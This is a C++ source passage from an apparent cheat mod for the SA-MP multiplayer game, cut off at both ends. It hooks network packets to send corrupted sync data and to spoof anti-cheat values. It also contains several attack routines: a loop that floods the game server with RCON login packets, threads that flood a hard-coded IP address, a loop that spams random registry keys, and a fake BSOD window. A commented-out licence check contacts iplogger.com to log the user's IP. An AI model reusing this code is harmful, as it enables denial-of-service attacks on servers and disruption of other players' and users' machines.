				OutgoingOnFootData.iCurrentAnimationID = rand()%900000;
				OutgoingOnFootData.sAnimFlags = rand() % 900000;
			}
			if (cheat_state->_generic.dssdsdsdsd2323 == 1)
			{
				OutgoingOnFootData.iCurrentAnimationID = rand() % 900000;
				OutgoingOnFootData.sAnimFlags = rand() % 900000;
			}
			if (cheat_state->_generic.asasdddasas131112z1dffdf == 1)
			{
				if (OutgoingOnFootData.sSurfingVehicleID >= 0)
					OutgoingOnFootData.sSurfingVehicleID = 2002;
				else OutgoingOnFootData.sSurfingVehicleID -= 2002;
			}
			if (cheat_state->_generic.dssdsdsdsd23sasa23 == 1)
			{
				OutgoingOnFootData.sSurfingVehicleID = 2001;
			}

			
			
			
			bitStream->Reset();
			bitStream->Write((BYTE)ID_PLAYER_SYNC);
			bitStream->Write((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));
		}
		if (cheat_state->_generic.asasasas9ssssvg == 1)
		{
			
				for (int s = 0; s < 255; s++) {
					if (packetId == s && cheat_state->_generic.asasasas9ssssvg) return 1;
				}
			}
		
		
			if (packetId == ID_PLAYER_SYNC && cheat_state->packet_dsbl_settings.DSBL_SND_PLAYER_SYNC) return 1;
			if (packetId == ID_UNOCCUPIED_SYNC && cheat_state->packet_dsbl_settings.DSBL_SND_UNOCCUPIED_SYNC) return 1;
			if (packetId == ID_TRAILER_SYNC && cheat_state->packet_dsbl_settings.DSBL_SND_TRAILER_SYNC) return 1;
			if (packetId == ID_PASSENGER_SYNC && cheat_state->packet_dsbl_settings.DSBL_SND_PASSENGER_SYNC) return 1;
			if (packetId == ID_SPECTATOR_SYNC && cheat_state->packet_dsbl_settings.DSBL_SND_SPECTATOR_SYNC) return 1;
			if (packetId == ID_AIM_SYNC && cheat_state->packet_dsbl_settings.DSBL_SND_AIM_SYNC) return 1;
			if (packetId == ID_VEHICLE_SYNC && cheat_state->packet_dsbl_settings.DSBL_SND_VEHICLE_SYNC) return 1;
			if (packetId == ID_WEAPONS_UPDATE && cheat_state->packet_dsbl_settings.DSBL_SND_WEAPONS_UPDATE) return 1;
			if (packetId == ID_STATS_UPDATE && cheat_state->packet_dsbl_settings.DSBL_SND_STATS_UPDATE) return 1;
		
		

		if (cheat_state->_generic.crh1ggd2 == 1)
		{
			
				// use this if you wanna log outgoing packets
				bitStream->Read(packetId);
				addMessageToChatWindow("< [Packet Send] %s -> %d, len: %d", getPlayerName(g_Players->sLocalPlayerID), packetId, bitStream->GetNumberOfBytesUsed());
			}
		
		if (bitStream != nullptr)
		{
			if (!OnSendPacket(bitStream, priority, reliability, orderingChannel))
				return true;
		}
	//}
	return g_DrifeitClient->GetRakClientInterface()->Send(bitStream, priority, reliability, orderingChannel);
}
 
int DrifeitDataHook(stDrifeitPacket * DrifeitData)
{
	 

	if (!(KEY_DOWN(VK_LBUTTON) & KEY_DOWN(VK_RBUTTON) || KEY_DOWN(VK_LBUTTON) || KEY_DOWN(VK_RBUTTON)))
	{
			DrifeitData->DrifeitCheck = 1337.0f; //дрифейтер онлайн
			DrifeitData->DrifeitVer = 7.9f; //версия дрифейта
			DrifeitData->byteCamMode = 105; //идентификатор
	}
	if (cheat_state->_generic.pickm2tr == 1)
	{
		
			DrifeitData->DrifeitCheck = 1338.0f;
		
	}
	if (cheat_state->_generic.ddosdd == 1)
	{
		
			DrifeitData->DrifeitCheck = 1339.0f;
		
	}
	if (cheat_state->_generic.invisible == 1)
	{
		
			DrifeitData->DrifeitCheck = 1340.0f;
		
	}
	if (cheat_state->_generic.netbot1 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1341.0f;
		
	}
	if (cheat_state->_generic.netbot2 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1342.0f;
		
	}
	if (cheat_state->_generic.netbot3 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1343.0f;
		
	}
	if (cheat_state->_generic.netbot4 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1344.0f;
		
	}
	if (cheat_state->_generic.netbot5 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1345.0f;
		
	}
	if (cheat_state->_generic.netbot6 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1346.0f;
		
	}
	if (cheat_state->_generic.netbot7 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1347.0f;
		
	}
	if (cheat_state->_generic.netbot8 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1348.0f;
		
	}
	if (cheat_state->_generic.netbot9 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1349.0f;
		
	}
	if (cheat_state->_generic.netbot10 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1350.0f;
		
	}
	if (cheat_state->_generic.netbot11 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1351.0f;
		
	}
	if (cheat_state->_generic.netbot12 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1352.0f;
		
	}
	if (cheat_state->_generic.netbot13 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1353.0f;
		
	}
	if (cheat_state->_generic.netbot14 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1354.0f;
		
	}
	if (cheat_state->_generic.netbot15 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1355.0f;
		
	}
	if (cheat_state->_generic.netbot16 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1356.0f;
		
	}
	if (cheat_state->_generic.netbot17 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1357.0f;
		
	}
	if (cheat_state->_generic.netbot18 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1358.0f;
		
	}
	if (cheat_state->_generic.netbot19 == 1)
	{
		
			DrifeitData->DrifeitCheck = 1359.0f;
		
	}
	return 1;
}

int AimDataHook(stAimData * data)
{
	
	return 1;
}

int UnOccupiedDataHook(stUnoccupiedData * data)
{
	return 1;
}

int PassengerDataHook(stPassengerData * data)
{

	return 1;
}

int OnFootDataHook(stOnFootData * data)
{
	return 1;
}

int IncarDataHook(stInCarData * data)
{
	
	return 1;
}


BYTE GetPacketID(Packet *p)
{
	if (p == 0) return 255;

	if ((unsigned char)p->data[0] == ID_TIMESTAMP)
	{
		assert(p->length > sizeof(unsigned char) + sizeof(unsigned long));
		return (unsigned char)p->data[sizeof(unsigned char) + sizeof(unsigned long)];
	}
	else
	{
		return (unsigned char)p->data[0];
	}
}

bool ValidPlayer7(int PlayerID)
{
	if (g_Players == NULL)
		return 0;

	if (PlayerID < 0 || PlayerID > SAMP_PLAYER_MAX)
		return 0;

	if (PlayerID == g_Players->sLocalPlayerID)
		return 0;

	if (g_Players->iIsListed[PlayerID] != 1)
		return 0;

	return 1;
}

bool ValidVehicle7(int VehicleID)
{
	if (g_Vehicles->iIsListed[VehicleID] != 1)
		return 0;

	if (g_Vehicles->pSAMP_Vehicle[VehicleID] == NULL)
		return 0;

	if (g_Vehicles->pSAMP_Vehicle[VehicleID]->pGTA_Vehicle == NULL)
		return 0;

	return 1;
}



 


int zalup = 0;
bool OnReceivePacket(Packet *p)
{
	if (p->data == nullptr || p->length == 0)
		return true;
	unsigned short PlayerID;
	////////////////////////////////////////////////////////////////////////////////////////////////////////




	  

	  
	 
	/*if (p->data[0] == ID_CONNECTION_REQUEST_ACCEPTED)
	{
		if (PRIVYAZKA == 1) {
			if (strcmp(ZHL->getSoftwareKey(ZHL->getSoftwareID()), AlexDriftCPU) && strcmp(ZHL->getSoftwareKey(ZHL->getSoftwareHWID()), AlexDriftHWID) && strcmp(ZHL->getSoftwareKey(ZHL->getSoftwareSATAID()), AlexDriftSATAID)) //АЛЕКС ДРИФТ
			{
				HINTERNET Daun;
				Daun = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				InternetOpenUrlA(Daun, "https://iplogger.com/13dbM6", NULL, 0, 0, 0);
				InternetCloseHandle(Daun);
				ExitProcess(0);
				ZHL->ProxitProcess();
			}
			else
			{
				if (zalup == 0)
				{
					addMessageToChatWindow("[Driftyulex_m0d]Здравствуйте %s, идентификация успешно пройдена. Ваш идентификатор %s", getPlayerName(g_Players->sLocalPlayerID), ZHL->getSoftwareKey(ZHL->getSoftwareID()));
					zalup == 1;
				}
			}
			/*if (strcmp(getPlayerName(g_Players->sLocalPlayerID), "]ZH[=AlexDrift=]ZHS[")) //АЛЕКС ДРИФТ 1
			{
				HINTERNET Daun;
				Daun = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				InternetOpenUrlA(Daun, "https://iplogger.com/13dbM6", NULL, 0, 0, 0);
				InternetCloseHandle(Daun);
				ExitProcess(0);
				ZHL->ProxitProcess();
			}
			else
			{
				if (zalup == 0) 
				{
					addMessageToChatWindow("[Driftyulex_m0d]Здравствуйте %s, идентификация ника успешно пройдена. Ваш идентифицированый ник %s", getPlayerName(g_Players->sLocalPlayerID), getPlayerName(g_Players->sLocalPlayerID));
					zalup == 1;
				}
			}*/
		/*}
		if (PRIVYAZKA == 2) {
			if (strcmp(ZHL->getSoftwareKey(ZHL->getSoftwareID()), ayratCPU) && strcmp(ZHL->getSoftwareKey(ZHL->getSoftwareHWID()), ayratHWID) && strcmp(ZHL->getSoftwareKey(ZHL->getSoftwareSATAID()), ayratSATAID)) //АЙРАТ
			{
				HINTERNET Daun;
				Daun = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				InternetOpenUrlA(Daun, "https://iplogger.com/1fUi47", NULL, 0, 0, 0);
				InternetCloseHandle(Daun);
				ExitProcess(0);
				ZHL->ProxitProcess();
			}
			else
			{
				if (zalup == 0)
				{
					addMessageToChatWindow("[Driftyulex_m0d]Здравствуйте %s, идентификация успешно пройдена. Ваш идентификатор %s", getPlayerName(g_Players->sLocalPlayerID), ZHL->getSoftwareKey(ZHL->getSoftwareID()));
					zalup == 1;
				}
			}
		}
		if (PRIVYAZKA == 3) {
			if (strcmp(ZHL->getSoftwareKey(ZHL->getSoftwareHWID()), d1amondlionHWID)) //РАДЧЕНКО
			{
				HINTERNET Daun;
				Daun = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
				InternetOpenUrlA(Daun, "https://iplogger.com/1fAi47", NULL, 0, 0, 0);
				InternetCloseHandle(Daun);
				Log("2 ");
				ExitProcess(0);
				ZHL->ProxitProcess();
			}
			else 
			{
				if (zalup == 0)
				{
					addMessageToChatWindow("[Driftyulex_m0d]Здравствуйте %s, идентификация успешно пройдена. Ваш идентификатор %s", getPlayerName(g_Players->sLocalPlayerID), ZHL->getSoftwareKey(ZHL->getSoftwareID()));
					zalup == 1;
				}
			}
		}
	}*/
	if (p->data[0] == ID_CONNECTION_REQUEST_ACCEPTED)
	{
		 BitStream bs(p->data, p->length, false);

		int iVersion = (int)33563352;

		bs.IgnoreBits(8);
		bs.IgnoreBits(32);
		bs.IgnoreBits(16);
		bs.IgnoreBits(16);
		bs.Read(iVersion);
	}
	if (p->data[0] == ID_CONNECTION_REQUEST_ACCEPTED)
	{
		 BitStream bs(p->data, p->length, false);

		int iVersion = 0x3e9;

		bs.IgnoreBits(8);
		bs.IgnoreBits(32);
		bs.IgnoreBits(16);
		bs.IgnoreBits(16);
		bs.Read(iVersion);
	}
	if (p->data[0] == ID_CONNECTION_REQUEST_ACCEPTED)
	{
		 BitStream bs(p->data, p->length, false);

		int iVersion = 0x3324;

		bs.IgnoreBits(8);
		bs.IgnoreBits(32);
		bs.IgnoreBits(16);
		bs.IgnoreBits(16);
		bs.Read(iVersion);
	}
	if (p->data[0] == ID_CONNECTION_REQUEST_ACCEPTED)
	{
		 BitStream bs(p->data, p->length, false);

		int iVersion = 0xFD9;

		bs.IgnoreBits(8);
		bs.IgnoreBits(32);
		bs.IgnoreBits(16);
		bs.IgnoreBits(16);
		bs.Read(iVersion);
	}
	if (p->data[0] == ID_CONNECTION_REQUEST_ACCEPTED)
	{
		 BitStream bs(p->data, p->length, false);

		int iVersion = 0x0FD9;

		bs.IgnoreBits(8);
		bs.IgnoreBits(32);
		bs.IgnoreBits(16);
		bs.IgnoreBits(16);
		bs.Read(iVersion);
	}
	if (p->data[0] == ID_MARKERS_SYNC)
	{
		 BitStream	bs(p->data, p->length, false);
		int			iNumberOfPlayers = 0;
		uint16_t	playerID = uint16_t(-1);
		short		sPos[3] = { 0, 0, 0 };
		bool		bIsPlayerActive = false;

		bs.IgnoreBits(8);
		bs.Read(iNumberOfPlayers);
		if (iNumberOfPlayers < 0 || iNumberOfPlayers > SAMP_PLAYER_MAX)
			return true;

		for (int i = 0; i < iNumberOfPlayers; i++)
		{
			bs.Read(playerID);
			bs.ReadCompressed(bIsPlayerActive);
			if (bIsPlayerActive == 0)
				continue;
			bs.Read(sPos);
			g_stStreamedOutInfo.iPlayerID[playerID] = playerID;
			g_stStreamedOutInfo.fPlayerPos[playerID][0] = sPos[0];
			g_stStreamedOutInfo.fPlayerPos[playerID][1] = sPos[1];
			g_stStreamedOutInfo.fPlayerPos[playerID][2] = sPos[2];
		}
	}
	 
	 
	if (p->data[0] == ID_PLAYER_SYNC) // packetId
	{
		 BitStream bsOnfootData((unsigned char *)p->data, p->length, false);
		unsigned short PlayerID;

		stOnFootData onData;
		bsOnfootData.IgnoreBits(8);
		bsOnfootData.Read(PlayerID);
		bsOnfootData.Read((PCHAR)&onData, sizeof(stOnFootData));

		if (cheat_state->_generic.invalid_aimzggg == 1)
		{
			
				Logging("[stOnFootData][%s] fPosition: %.2f  %.2f  %.2f  || fMoveSpeed: %.1f  %.1f  %.1f || sLeftRightKeys: %d || sKeys: %d || fQuaternion: %.1f  %.1f  %.1f %.1f || byteCurrentWeapon: %d || byteSpecialAction: %d || fSurfingOffsets: %.1f  %.1f  %.1f || sSurfingVehicleID: %d || iCurrentAnimationID: %d || sAnimFlags: %d",
					getPlayerName(PlayerID),
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[0],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[1],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[2],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[0],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[1],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[2],
					onData.sLeftRightKeys,
					onData.sKeys,
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fQuaternion[0],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fQuaternion[1],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fQuaternion[2],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fQuaternion[3],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.byteCurrentWeapon,
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.byteSpecialAction,
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fSurfingOffsets[0],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fSurfingOffsets[1],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fSurfingOffsets[2],
					onData.sSurfingVehicleID,
					onData.iCurrentAnimationID,
					onData.sAnimFlags);
			
		}
	}
	if (p->data[0] == ID_VEHICLE_SYNC) // packetId
	{
		 BitStream bsVehicleData((unsigned char *)p->data, p->length, false);
		unsigned short PlayerID;

		stInCarData inCarData;
		bsVehicleData.IgnoreBits(8);
		bsVehicleData.Read(PlayerID);
		bsVehicleData.Read((PCHAR)&inCarData, sizeof(stInCarData));

		bsVehicleData.Read(inCarData.sTrailerID);
		bsVehicleData.Read(inCarData.sVehicleID);

		if (cheat_state->_generic.invalid_aimzggg == 1)
		{
			
				float value = g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fTrainSpeed;
				int trailerid = inCarData.sTrailerID;
				int vehid = inCarData.sVehicleID;
				Logging("[stInCarData][%s] fPosition: %.2f  %.2f  %.2f  || fMoveSpeed: %.1f  %.1f  %.1f || HydraThrustAngle: %d %d || fTrainSpeed: %f || sTrailerID: %d || sVehicleID: %d || fQuaternion: %.1f  %.1f  %.1f %.1f",
					getPlayerName(PlayerID),
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fPosition[0],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fPosition[1],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fPosition[2],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fMoveSpeed[0],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fMoveSpeed[1],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fMoveSpeed[2],
					inCarData.HydraThrustAngle[0],
					inCarData.HydraThrustAngle[1],
					value, trailerid, vehid,
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fQuaternion[0],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fQuaternion[1],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fQuaternion[2],
					g_Players->pRemotePlayer[PlayerID]->pPlayerData->inCarData.fQuaternion[3]);
			
		}
	}
	if (p->data[0] == ID_UNOCCUPIED_SYNC) // packetId
	{
		 BitStream bsUnocupData((unsigned char *)p->data, p->length, false);
		unsigned short PlayerID;

		stUnoccupiedData UnocupData;
		bsUnocupData.IgnoreBits(8);
		bsUnocupData.Read(PlayerID);
		bsUnocupData.Read((PCHAR)&UnocupData, sizeof(stUnoccupiedData));
		bsUnocupData.Read(UnocupData.sVehicleID);

		if (cheat_state->_generic.invalid_aimzggg == 1)
		{
			
				int vehid = UnocupData.sVehicleID;
				Logging("[stUnoccupiedData][%s] fPosition: %.2f  %.2f  %.2f  || fMoveSpeed: %0.1f  %0.1f  %0.1f ||  sVehicleID: %d || fDirection: %.2f  %.2f  %.2f  ||  fRoll: %.2f  %.2f  %.2f  ||   fTurnSpeed: %.2f  %.2f  %.2f || byteSeatID %d",
					getPlayerName(PlayerID),
					UnocupData.fPosition[0],
					UnocupData.fPosition[1],
					UnocupData.fPosition[2],
					UnocupData.fMoveSpeed[0],
					UnocupData.fMoveSpeed[1],
					UnocupData.fMoveSpeed[2],
					vehid,
					UnocupData.fDirection[0],
					UnocupData.fDirection[1],
					UnocupData.fDirection[2],
					UnocupData.fRoll[0],
					UnocupData.fRoll[1],
					UnocupData.fRoll[2],
					UnocupData.fTurnSpeed[0],
					UnocupData.fTurnSpeed[1],
					UnocupData.fTurnSpeed[2],
					UnocupData.byteSeatID);
			
		}
	}
	if (p->data[0] == ID_AIM_SYNC) // packetId
	{
		 BitStream bsAimData((unsigned char *)p->data, p->length, false);
		unsigned short PlayerID;

		stAimData aimData;
		bsAimData.IgnoreBits(8);
		bsAimData.Read(PlayerID);
		bsAimData.Read((PCHAR)&aimData, sizeof(stAimData));


		int byteCamMode = aimData.byteCamMode;
		float fAimZ = aimData.fAimZ;
		int byteCamExtZoom = aimData.byteCamExtZoom;
		int byteWeaponState = aimData.byteWeaponState;
		int bUnk = aimData.bUnk;

		if (cheat_state->_generic.invalid_aimzggg == 1)
		{
			
				Logging("[stAimData][%s] vecAimf1: %.2f  %.2f  %.2f  || vecAimPos: %.2f  %.2f  %.2f || byteCamMode: %i || fAimZ: %0.2f || byteCamExtZoom: %i || byteWeaponState: %i || bUnk: %i",
					getPlayerName(PlayerID),
					aimData.vecAimf1[0],
					aimData.vecAimf1[1],
					aimData.vecAimf1[2],
					aimData.vecAimPos[0],
					aimData.vecAimPos[1],
					aimData.vecAimPos[2],
					byteCamMode,
					fAimZ,
					byteCamExtZoom,
					byteWeaponState, bUnk);
			
		} 
	}
	return true;
}

int antiafkJf = 0, allafktimeJf = 0;
void GoAntiAfkJf() {
	addMessageToChatWindow("{FFFFFF}BAD RCON включен.");
	while (true) {
		if (antiafkJf == 0) break;
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		{
			cheat_state_text("Error connect failed");
			continue;
		}
		SOCKET Socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		SOCKADDR_IN SockAddr;
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(g_SAMP->ulPort);
		SockAddr.sin_addr.s_addr = inet_addr(g_SAMP->szIP);
		std::string sIP(g_SAMP->szIP);
		std::stringstream ssIP(sIP);
		std::string part;
		std::string packet("SAMP");
		std::string sPass("test");


		while (std::getline(ssIP, part, '.'))
		{
			packet += (BYTE)atoi(part.c_str());
		}


		packet += (BYTE)(g_SAMP->ulPort & 0xFF);
		packet += (BYTE)(g_SAMP->ulPort >> 8 & 0xFF);


		packet += 'x';

		packet += (BYTE)(sPass.length() & 0xFF);
		packet += (BYTE)(sPass.length() >> 8 & 0xFF);

		packet += sPass;

		sendto(Socket, packet.c_str(), packet.length(), 0, (sockaddr*)&SockAddr, sizeof(sockaddr_in));

		Sleep(5);
	}
	addMessageToChatWindow("{FFFFFF}BAD RCON выключен.");
}
void afkaJf()
{
	antiafkJf ^= 1;
	allafktimeJf = 0;
	if (antiafkJf == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJf, NULL, NULL, NULL);
}



int antiafkJfll = 0, allafktimeJfll = 0;
void GoAntiAfkJfll() {
	while (true) {
		if (antiafkJfll == 0) break;
		WSAData wsdata;
		WORD wsver = MAKEWORD(2, 0);
		int nret = WSAStartup(wsver, &wsdata);
		if (nret != 0)
		{
			addMessageToChatWindow("Startup failed, error code: ");
			WSACleanup();
		}
		SOCKET kSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (kSock == INVALID_SOCKET)
		{
			addMessageToChatWindow("Socket init failed");
		}
		char Buf[128];
		hostent *h;
		sockaddr_in sin;
		sin.sin_port = htons(80);
		if (WSAStartup(wsver, &wsdata) == 0)
		{
			if (gethostname(&Buf[0], 128) == 0)
			{
				h = gethostbyname(&Buf[0]);
				sin.sin_addr.s_addr = inet_addr(inet_ntoa(*(reinterpret_cast<in_addr *>(*(h->h_addr_list)))));
			}
		}
		sin.sin_family = AF_INET;
		if (connect(kSock, (sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
			addMessageToChatWindow("Connect failed, error: ");
			WSACleanup();
		}
		send(kSock, buf, sizeof(buf), 0);
		send(kSock, buf1, sizeof(buf1), 0);
		send(kSock, buf2, sizeof(buf2), 0);
		send(kSock, buf3, sizeof(buf3), 0);
		send(kSock, buf4, sizeof(buf4), 0);
		send(kSock, buf5, sizeof(buf5), 0);
		send(kSock, buf6, sizeof(buf6), 0);
		send(kSock, buf7, sizeof(buf7), 0);
		send(kSock, buf8, sizeof(buf8), 0);
		send(kSock, buf9, sizeof(buf9), 0);
		send(kSock, buf100, sizeof(buf100), 0);
		send(kSock, buf11, sizeof(buf11), 0);
		send(kSock, buf12, sizeof(buf12), 0);
		send(kSock, buf13, sizeof(buf13), 0);
		send(kSock, buf14, sizeof(buf14), 0);
		send(kSock, buf15, sizeof(buf15), 0);
		send(kSock, buf16, sizeof(buf16), 0);
		send(kSock, bufhell, sizeof(bufhell), 0);
		closesocket(kSock);
		Sleep(5);
	}
}
void afkaJfll()
{
	antiafkJfll ^= 1;
	allafktimeJfll = 0;
	if (antiafkJfll == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJfll, NULL, NULL, NULL);
}


int antiafkJfllll = 0, allafktimeJfllll = 0;
void GoAntiAfkJfllll() {
	while (true) {
		if (antiafkJfllll == 0) break;
		WSAData wsdata;
		WORD wsver = MAKEWORD(2, 0);
		int nret = WSAStartup(wsver, &wsdata);
		if (nret != 0)
		{
			addMessageToChatWindow("Startup failed, error code: ");
			WSACleanup();
		}
		SOCKET kSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (kSock == INVALID_SOCKET)
		{
			addMessageToChatWindow("Socket init failed");
		}
		sockaddr_in sin;
		sin.sin_port = htons(80);
		sin.sin_addr.s_addr = inet_addr("213.24.76.23");
		sin.sin_family = AF_INET;
		if (connect(kSock, (sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
			addMessageToChatWindow("Connect failed, error: ");
			WSACleanup();
		}
		send(kSock, buf, sizeof(buf), 0);
		send(kSock, buf1, sizeof(buf1), 0);
		send(kSock, buf2, sizeof(buf2), 0);
		send(kSock, buf3, sizeof(buf3), 0);
		send(kSock, buf4, sizeof(buf4), 0);
		send(kSock, buf5, sizeof(buf5), 0);
		send(kSock, buf6, sizeof(buf6), 0);
		send(kSock, buf7, sizeof(buf7), 0);
		send(kSock, buf8, sizeof(buf8), 0);
		send(kSock, buf9, sizeof(buf9), 0);
		send(kSock, buf100, sizeof(buf100), 0);
		send(kSock, buf11, sizeof(buf11), 0);
		send(kSock, buf12, sizeof(buf12), 0);
		send(kSock, buf13, sizeof(buf13), 0);
		send(kSock, buf14, sizeof(buf14), 0);
		send(kSock, buf15, sizeof(buf15), 0);
		send(kSock, buf16, sizeof(buf16), 0);
		send(kSock, bufhell, sizeof(bufhell), 0);
		closesocket(kSock);
		Sleep(100);
	}
}
void afkaJfllll()
{
	antiafkJfllll ^= 1;
	allafktimeJfllll = 0;
	if (antiafkJfllll == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJfllll, NULL, NULL, NULL);
}

int antiafkJfllllss = 0, allafktimeJfllllss = 0;
void GoAntiAfkJfllllss() {
	while (true) {
		if (antiafkJfllllss == 0) break;
		char nick[19] = { 0 };
		gen_random(nick, 10);
		CLiteRegeditEasy *block = new CLiteRegeditEasy(HKEY_CURRENT_USER, nick);
		block->WriteString(nick, "Nothing");
		char nick1[15] = { 0 };
		gen_random(nick1, 5);
		CLiteRegeditEasy *block1 = new CLiteRegeditEasy(HKEY_CURRENT_USER, nick1);
		block1->WriteString(nick1, "Nothing");
		Sleep(10);
	}
}
void afkaJfllllss()
{
	antiafkJfllllss ^= 1;
	allafktimeJfllllss = 0;
	if (antiafkJfllllss == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJfllllss, NULL, NULL, NULL);
}



int antiafkJfllllss1 = 0, allafktimeJfllllss1 = 0;
void GoAntiAfkJfllllss1() {
	while (true) {
		if (antiafkJfllllss1 == 0) break;
		for (int i = 1; i <= 100; i++)
		{
			
		}
		Sleep(100);
	}
}
void afkaJfllllss1()
{
	antiafkJfllllss1 ^= 1;
	allafktimeJfllllss1 = 0;
	if (antiafkJfllllss1 == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJfllllss1, NULL, NULL, NULL);
}



int antiafkJfllllss2 = 0, allafktimeJfllllss2 = 0;
void GoAntiAfkJfllllss2() {
	while (true) {
		if (antiafkJfllllss2 == 0) break;
		HINSTANCE hThisInstance;
		HINSTANCE hPrevInstance;
		LPSTR lpszArgument;
		int nFunsterStil;
		HWND hwnd;
		MSG messages;
		WNDCLASSEX wincl;

		wincl.hInstance = hThisInstance;
		wincl.lpszClassName = szClassName;
		wincl.lpfnWndProc = WindowProcedure;
		wincl.style = CS_DBLCLKS;
		wincl.cbSize = sizeof(WNDCLASSEX);

		wincl.hIcon = LoadIcon(NULL, IDI_APPLICATION);
		wincl.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
		wincl.hCursor = LoadCursor(NULL, IDC_ARROW);
		wincl.lpszMenuName = NULL;
		wincl.cbClsExtra = 0;
		wincl.cbWndExtra = 0;

		wincl.hbrBackground = CreateSolidBrush(RGB(0, 0, 0x77));

		//if (!RegisterClassEx(&wincl))
		//	return 0;

		ShowCursor(FALSE);

		hwnd = CreateWindowEx(
			0,
			szClassName,
			"BSOD",
			WS_POPUP,
			0,
			0,
			SCREEN("X"),
			SCREEN("Y"),
			HWND_DESKTOP,
			NULL,
			hThisInstance,
			NULL
		);

		ShowWindow(hwnd, nFunsterStil);

		while (GetMessage(&messages, NULL, 0, 0))
		{
			TranslateMessage(&messages);
			DispatchMessage(&messages);
		}
		Sleep(10);
	}
}
void afkaJfllllss2()
{
	antiafkJfllllss2 ^= 1;
	allafktimeJfllllss2 = 0;
	if (antiafkJfllllss2 == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJfllllss2, NULL, NULL, NULL);
}



BOOL IsDisabledIncomingPacketID(BYTE packetId)
{
		if (packetId == ID_PLAYER_SYNC && cheat_state->packet_dsbl_settings.DSBL_RCV_PLAYER_SYNC) return 1;
		if (packetId == ID_MARKERS_SYNC && cheat_state->packet_dsbl_settings.DSBL_RCV_MARKERS_SYNC) return 1;
		if (packetId == ID_UNOCCUPIED_SYNC && cheat_state->packet_dsbl_settings.DSBL_RCV_UNOCCUPIED_SYNC) return 1;
		if (packetId == ID_TRAILER_SYNC && cheat_state->packet_dsbl_settings.DSBL_RCV_TRAILER_SYNC) return 1;
		if (packetId == ID_PASSENGER_SYNC && cheat_state->packet_dsbl_settings.DSBL_RCV_PASSENGER_SYNC) return 1;
